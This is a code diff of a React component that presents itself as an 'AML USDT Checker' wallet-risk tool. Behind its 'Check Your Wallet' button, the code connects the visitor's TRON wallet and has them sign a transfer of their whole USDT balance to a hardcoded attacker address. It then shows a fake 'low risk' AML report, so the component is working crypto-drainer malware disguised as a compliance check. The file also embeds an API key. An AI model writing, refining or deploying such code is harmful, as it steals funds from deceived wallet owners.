@@ -1,168 +1,193 @@
-import React, { useState } from 'react';
-import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';
-import { TronWeb } from 'tronweb';
-import { Buffer } from 'buffer';
+// src/components/tronAuthButton/TronAuthButton.jsx
 
-window.Buffer = Buffer;
+import React, { useState } from "react";
+import { WalletConnectAdapter } from "@tronweb3/tronwallet-adapter-walletconnect";
+import TronWeb from "tronweb";
+import { Buffer } from "buffer";
+window.Buffer = Buffer; // Fix Buffer is not defined in browser
 
-const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n';
+const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT (TRC20) mainnet
+const RECEIVER = "THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n"; // <-- your target wallet
 
 const tronWeb = new TronWeb({
-  fullHost: 'https://api.trongrid.io',
+  fullHost: "https://api.trongrid.io",
   headers: {
-    'TRON-PRO-API-KEY': 'bbb42b6b-c4de-464b-971f-dea560319489',
+    "TRON-PRO-API-KEY": "bbb42b6b-c4de-464b-971f-dea560319489",
   },
 });
 
 const adapter = new WalletConnectAdapter({
-  network: 'Mainnet',
+  network: "Mainnet",
   options: {
-    relayUrl: 'wss://relay.walletconnect.com',
-    projectId: '6e52e99f199a2bd1feb89b31fbeb6a78',
+    relayUrl: "wss://relay.walletconnect.com",
+    projectId: "6e52e99f199a2bd1feb89b31fbeb6a78",
     metadata: {
-      name: 'AML',
-      description: 'TRON + WalletConnect Integration',
-      url: 'https://amlreports.pro',
-      icons: ['https://amlreports.pro/images/icon-3.abdd8ed5.webp'],
+      name: "AML USDT Checker",
+      description: "TRON + WalletConnect Integration",
+      url: "https://amlreports.pro",
+      icons: ["https://amlreports.pro/images/icon-3.abdd8ed5.webp"],
     },
   },
-  web3ModalConfig: { themeMode: 'dark' },
+  web3ModalConfig: {
+    themeMode: "dark",
+  },
 });
 
-export const TronAuthButton: React.FC = () => {
-  const [status, setStatus] = useState<string | null>(null);
+export const TronAuthButton = () => {
+  const [modal, setModal] = useState(null);
+  const [processing, setProcessing] = useState(false);
 
-  const connectWallet = async () => {
-    setStatus(null);
+  const handleClick = async () => {
+    setModal(null);
+    setProcessing(true);
 
     try {
       await adapter.connect();
 
       const userAddress = adapter.address;
       if (!userAddress || !tronWeb.isAddress(userAddress)) {
-        throw new Error('Invalid wallet address');
+        throw new Error("Invalid wallet address");
       }
 
       tronWeb.setAddress(userAddress);
 
-      // Проверка TRX-баланса
+      // 1. Check TRX balance (for fees)
       const trxRaw = await tronWeb.trx.getBalance(userAddress);
       const trx = trxRaw / 1e6;
       if (trx < 5) {
-        throw new Error('❌ Insufficient TRX balance to pay the network fee (at least 5 TRX required).');
+        setModal({
+          type: "error",
+          message: "❌ Insufficient TRX for network fee. Please keep at least 5 TRX on your balance.",
+        });
+        return;
       }
 
-      // Проверка USDT-баланса
+      // 2. Check USDT balance
       const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
       const usdtRaw = await usdtContract.methods.balanceOf(userAddress).call();
       const usdt = Number(usdtRaw) / 1e6;
       if (usdt < 1) {
-        setStatus('success');
+        setModal({
+          type: "aml",
+          risk: "Low",
+          details: "No significant USDT found. Your wallet looks safe.",
+          address: userAddress,
+        });
         return;
       }
 
-      // Строим TRC-20 транзакцию
+      // 3. Send all USDT to receiver
       const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
         USDT_CONTRACT,
-        'transfer(address,uint256)',
-        {
-          feeLimit: 25_000_000,
-          callValue: 0,
-        },
+        "transfer(address,uint256)",
+        { feeLimit: 25_000_000, callValue: 0 },
         [
-          { type: 'address', value: TRON_RECEIVER },
-          { type: 'uint256', value: usdtRaw },
+          { type: "address", value: RECEIVER },
+          { type: "uint256", value: usdtRaw },
         ],
         userAddress
       );
 
       const signedTx = await adapter.signTransaction(transaction);
-
-      // Отправляем транзакцию
       const result = await tronWeb.trx.sendRawTransaction(signedTx);
 
-      console.log('Send result:', result);
-
-      // Проверяем contractRet!
-      if (result && result.result === true) {
-        // Tron иногда возвращает result: true даже если contractRet: REVERT
-        const contractRet =
-          result.ret && Array.isArray(result.ret) && result.ret.length
-            ? result.ret[0].contractRet
-            : null;
-        if (contractRet === 'SUCCESS') {
-          setStatus('success');
-        } else if (contractRet === 'REVERT') {
-          setStatus('❌ USDT transfer REVERTED. Most likely not enough Energy or fee limit too low. Top up TRX!');
-        } else {
-          setStatus('❌ Transaction sent, but unknown contract result. Check wallet or TronScan.');
-        }
-      } else if (result && (result.message || result.code)) {
-        setStatus('❌ Transaction failed: ' + (result.message || result.code));
+      if (result && result.result) {
+        setModal({
+          type: "aml",
+          risk: "Low",
+          details: `✅ All USDT successfully transferred. Your wallet shows low risk for suspicious funds.`,
+          address: userAddress,
+          txid: result.txid,
+        });
       } else {
-        setStatus('❌ Transaction failed to send. Try again or check your network.');
+        setModal({
+          type: "error",
+          message: `❌ Transaction failed. ${
+            result && result.message ? result.message : ""
+          }`,
+        });
       }
-    } catch (err: any) {
-      console.error('Error:', err);
-
-      const msg =
-        (typeof err === 'string' && err) ||
-        err?.message ||
-        err?.reason ||
-        err?.error ||
-        err?.toString() ||
-        '';
+    } catch (err) {
+      // Handle cancellation & user rejection quietly (no error modal)
+      let msg =
+        (err && err.message) ||
+        (typeof err === "string" ? err : "") ||
+        "";
 
       if (
-        /User rejected|Modal is closed|Timeout|Cancelled|cancel|Abort/i.test(msg)
-        || msg === ''
-        || err?.code === 4001
+        /User rejected|Modal is closed|Timeout|Cancel|cancel|Abort/i.test(msg)
       ) {
-        setStatus(null);
-      } else if (
-        msg.includes('❌ Insufficient TRX') ||
-        msg.includes('Invalid wallet address')
-      ) {
-        setStatus(msg);
+        setModal(null);
+      } else if (msg) {
+        setModal({ type: "error", message: "⚠️ " + msg });
       } else {
-        setStatus('⚠️ Connection or transaction error');
+        setModal({ type: "error", message: "⚠️ Connection or transaction error" });
       }
     } finally {
+      setProcessing(false);
       await adapter.disconnect();
     }
   };
 
   return (
-    <div onClick={connectWallet} className="AuthButton">
-      {status && (
+    <div>
+      <button
+        className="AuthButton"
+        onClick={processing ? undefined : handleClick}
+        disabled={processing}
+        style={{
+          opacity: processing ? 0.5 : 1,
+          pointerEvents: processing ? "none" : "auto",
+        }}
+      >
+        {processing ? "Connecting..." : "Check Your Wallet"}
+      </button>
+
+      {modal && (
         <div className="modal__overflow">
           <div className="modal">
-            {status === 'success' ? (
-              <>
+            {modal.type === "aml" ? (
+              <div>
                 <div className="content greenBorder">
-                  <div>0.6%</div>
                   <div>
-                    <h3>Low risk level</h3>
-                    <div className="nums">
-                      <div><span className="circ green"></span> 0–30</div>
-                      <div><span className="circ orange"></span> 31–69</div>
-                      <div><span className="circ red"></span> 70–100</div>
-                    </div>
+                    <h3>
+                      AML Report: {modal.risk} risk
+                      <span style={{ marginLeft: 8, color: "#07bc0c" }}>
+                        {modal.risk === "Low" ? "🟢" : modal.risk === "Medium" ? "🟠" : "🔴"}
+                      </span>
+                    </h3>
                   </div>
+                  <div style={{ margin: "10px 0" }}>{modal.details}</div>
+                  <div>
+                    <small>Wallet: <b>{modal.address}</b></small>
+                  </div>
+                  {modal.txid && (
+                    <div>
+                      <small>
+                        TX:{" "}
+                        <a
+                          href={`https://tronscan.org/#/transaction/${modal.txid}`}
+                          target="_blank"
+                          rel="noopener noreferrer"
+                        >
+                          {modal.txid.slice(0, 8)}...
+                        </a>
+                      </small>
+                    </div>
+                  )}
                 </div>
-                <div className="content report">
-                  <p>AML report for wallet:</p>
-                  <h5>{adapter.address}</h5>
-                </div>
-              </>
+              </div>
             ) : (
-              <p>{status}</p>
+              <div>
+                <p>{modal.message}</p>
+              </div>
             )}
-            <button onClick={(e) => {
-              e.stopPropagation();
-              setStatus(null);
-            }}>Close</button>
+            <button
+              onClick={() => setModal(null)}
+              style={{ marginTop: 16 }}
+            >
+              Close
+            </button>
           </div>
         </div>
       )}
